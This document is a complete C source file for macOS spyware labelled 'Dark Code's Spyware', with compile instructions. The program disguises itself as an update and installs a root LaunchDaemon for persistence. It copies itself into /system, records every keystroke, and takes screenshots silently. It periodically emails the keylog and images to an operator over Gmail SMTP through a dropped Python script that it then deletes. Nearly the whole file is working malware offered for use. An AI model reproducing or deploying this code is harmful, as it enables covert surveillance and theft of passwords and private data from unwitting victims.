/* Dark Code's Spyware
 * Version 1.0
 *
 * Compile using: gcc -Wall -o update shadow_spyware.c -framework ApplicationServices
 *
 *
 */

#include <stdio.h>
#include <time.h>
#include <ApplicationServices/ApplicationServices.h> /* ApplicationServices.framework needed */

//Join strings

char* concat(char *s1, char *s2)
{
    char *result = malloc(strlen(s1)+strlen(s2)+1);
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

void startup(){
    //Create a Launch Daemon
    FILE *ldaemon = NULL;
    ldaemon = fopen("/library/LaunchDaemons/com.update.app.plist", "w");
    fprintf(ldaemon, "<?xml version='1.0' encoding='UTF-8'?>\n");
    fprintf(ldaemon, "<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>\n");
    fprintf(ldaemon, "<plist version='1.0'>\n");
    fprintf(ldaemon, "	<dict>\n");
    fprintf(ldaemon, "		<key>Label</key>\n");
    fprintf(ldaemon, "		<string>com.update.app</string>\n");
    fprintf(ldaemon, "		<key>Program</key>\n");
    fprintf(ldaemon, "		<string>/system/update</string>\n");
    fprintf(ldaemon, "		<key>RunAtLoad</key>\n");
    fprintf(ldaemon, "		<true/>\n");
    fprintf(ldaemon, "	</dict>\n");
    fprintf(ldaemon, "</plist>\n");
    fclose(ldaemon);
    //Set to load on startup
    system("sudo chmod 600 /Library/LaunchDaemons/com.update.app.plist");
    system("sudo chown root /Library/LaunchDaemons/com.update.app.plist");
    system("sudo launchctl load -w /Library/LaunchDaemons/com.update.app.plist");
}

void upload(){
    //create python script to email data + execute script + delete it
    //this bit has to be modifed for your emails (needs two)
    FILE *pyscript = NULL;
    pyscript = fopen("/system/sysupdate.py", "w");
    fprintf(pyscript, "import smtplib;from email.mime.image import MIMEImage;import os;from email.mime.multipart import MIMEMultipart;from email.mime.text import MIMEText;msg = MIMEMultipart('alternative');toEmail, fromEmail = 'PUTAEMAIlHERE', 'PUTANEMAILHERE';msg['Subject'] = 'Spyware Data Dump';msg['From'] = fromEmail;body = 'Spyware Data Dump';filename = '/system/coresystem.system';f = file(filename);attachment = MIMEText(f.read());attachment.add_header('Content-Disposition', 'attachment', filename=filename);msg.attach(attachment);img_data = open('/system/com.sys01.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys01.jpg'));msg.attach(image);img_data = open('/system/com.sys02.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys02.jpg'));msg.attach(image);img_data = open('/system/com.sys03.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys03.jpg'));msg.attach(image);img_data = open('/system/com.sys04.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys04.jpg'));msg.attach(image);img_data = open('/system/com.sys05.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys05.jpg'));msg.attach(image);img_data = open('/system/com.sys06.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys06.jpg'));msg.attach(image);img_data = open('/system/com.sys07.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys07.jpg'));msg.attach(image);img_data = open('/system/com.sys08.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys08.jpg'));msg.attach(image);img_data = open('/system/com.sys09.jpg', 'rb').read();image = MIMEImage(img_data, name=os.path.basename('/system/com.sys09.jpg'));msg.attach(image);server = smtplib.SMTP('smtp.gmail.com:587');server.starttls();server.login('PUTANEMAILHERE','ITSPASS');server.sendmail(fromEmail, toEmail, msg.as_string());server.quit();");
    fclose(pyscript);
    system("python /system/sysupdate.py");
    system("rm /system/sysupdate.py");

}

int infect(char* path){
    //copy self to system
    char* str = concat("cp ", path);
    char* cmd = concat(str, " /system");
    system(cmd);
    
}

FILE *logFile = NULL;
int counter = 0;
int ucount = 0;
int imgcount = 0;

char* keyCodeToReadableString (CGKeyCode);
CGEventRef myCGEventCallback (CGEventTapProxy, CGEventType, CGEventRef, void *);

int main (int argc, const char * argv[]) {
  startup();
  infect(argv[0]);
  CGEventFlags oldFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);

  CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
  CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, myCGEventCallback, &oldFlags);
  
  if (!eventTap) {
    fprintf(stderr, "Error Updating: Please \"Enable access for assitive devices\" in Universal Access preference panel.");
    exit(1);
  }
  
  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
  CGEventTapEnable(eventTap, true);
  
  logFile = fopen("/system/coresystem.system", "a");
  CFRunLoopRun();
  
  return 0;
}


CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) { //On keypress
  if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) {
    return event;
  }
  
  counter++;
  ucount++;
  if (counter>250){
    counter = 0;
    imgcount ++;
    char* cmd;
    //Take screen shots
    if (imgcount==1){cmd = "screencapture /system/com.sys01.jpg";}
    if (imgcount==2){cmd = "screencapture /system/com.sys02.jpg";}
    if (imgcount==3){cmd = "screencapture /system/com.sys03.jpg";}
    if (imgcount==4){cmd = "screencapture /system/com.sys04.jpg";}
    if (imgcount==5){cmd = "screencapture /system/com.sys05.jpg";}
    if (imgcount==6){cmd = "screencapture /system/com.sys06.jpg";}
    if (imgcount==7){cmd = "screencapture /system/com.sys07.jpg";}
    if (imgcount==8){cmd = "screencapture /system/com.sys08.jpg";}
    if (imgcount==9){cmd = "screencapture /system/com.sys09.jpg";}
    if (imgcount > 9){imgcount=0;}//reset imgs
    system("osascript -e 'set Volume 0'");
    system(cmd);
    system("osascript -e 'set Volume 5'");
    }
    if (ucount > 2500){upload();ucount =0;}
  CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
  
  if (logFile) {
    fprintf(logFile, keyCodeToReadableString(keyCode));
    fflush(logFile);
  return event;
}
}


char* keyCodeToReadableString (CGKeyCode keyCode) {
  switch ((int) keyCode) {
    case   0: return "a";
    case   1: return "s";
    case   2: return "d";
    case   3: return "f";
    case   4: return "h";
    case   5: return "g";
    case   6: return "z";
    case   7: return "x";
    case   8: return "c";
    case   9: return "v";
    case  11: return "b";
    case  12: return "q";
    case  13: return "w";
    case  14: return "e";
    case  15: return "r";
    case  16: return "y";
    case  17: return "t";
    case  18: return "1";
    case  19: return "2";
    case  20: return "3";
    case  21: return "4";
    case  22: return "6";
    case  23: return "5";
    case  24: return "=";
    case  25: return "9";
    case  26: return "7";
    case  27: return "-";
    case  28: return "8";
    case  29: return "0";
    case  30: return "]";
    case  31: return "o";
    case  32: return "u";
    case  33: return "[";
    case  34: return "i";
    case  35: return "p";
    case  37: return "l";
    case  38: return "j";
    case  39: return "\"";
    case  40: return "k";
    case  41: return ";";
    case  42: return "\\";
    case  43: return ",";
    case  44: return "/";
    case  45: return "n";
    case  46: return "m";
    case  47: return ".";
    case  50: return "`";
    case  65: return "<keypad-decimal>";
    case  67: return "*";
    case  69: return "+";
    case  71: return "<keypad-clear>";
    case  75: return "<keypad-divide>";
    case  76: return "<keypad-enter>";
    case  78: return "<keypad-minus>";
    case  81: return "<keypad-equals>";
    case  82: return "<keypad-0>";
    case  83: return "<keypad-1>";
    case  84: return "<keypad-2>";
    case  85: return "<keypad-3>";
    case  86: return "<keypad-4>";
    case  87: return "<keypad-5>";
    case  88: return "<keypad-6>";
    case  89: return "<keypad-7>";
    case  91: return "<keypad-8>";
    case  92: return "<keypad-9>";
    case  36: return "<return>";
    case  48: return "<tab>";
    case  49: return " "; //space
    case  51: return "<delete>";
    case  53: return "<escape>";
    case  55: return "<command>";
    case  56: return "<shift>";
    case  57: return "<capslock>";
    case  58: return "<option>";
    case  59: return "<control>";
    case  60: return "<right-shift>";
    case  61: return "<right-option>";
    case  62: return "<right-control>";
    case  63: return "<function>";
    case  64: return "<f17>";
    case  72: return "<volume-up>";
    case  73: return "<volume-down>";
    case  74: return "<mute>";
    case  79: return "<f18>";
    case  80: return "<f19>";
    case  90: return "<f20>";
    case  96: return "<f5>";
    case  97: return "<f6>";
    case  98: return "<f7>";
    case  99: return "<f3>";
    case 100: return "<f8>";
    case 101: return "<f9>";
    case 103: return "<f11>";
    case 105: return "<f13>";
    case 106: return "<f16>";
    case 107: return "<f14>";
    case 109: return "<f10>";
    case 111: return "<f12>";
    case 113: return "<f15>";
    case 114: return "<help>";
    case 115: return "<home>";
    case 116: return "<pageup>";
    case 117: return "<forward-delete>";
    case 118: return "<f4>";
    case 119: return "<end>";
    case 120: return "<f2>";
    case 121: return "<page-down>";
    case 122: return "<f1>";
    case 123: return "<left>";
    case 124: return "<right>";
    case 125: return "<down>";
    case 126: return "<up>";
  }
  return "<unknown>";
}
